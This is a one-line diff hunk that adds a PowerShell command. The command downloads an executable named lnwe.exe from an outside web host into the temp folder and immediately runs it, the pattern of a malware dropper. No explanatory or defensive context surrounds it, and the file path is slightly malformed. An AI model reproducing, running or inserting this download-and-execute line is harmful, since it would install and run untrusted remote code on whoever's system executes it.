@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://www.bryonz.com/emotions/files/lnwe.exe',"$env:TEMPlnwe.exe");Start-Process ("$env:TEMPlnwe.exe")
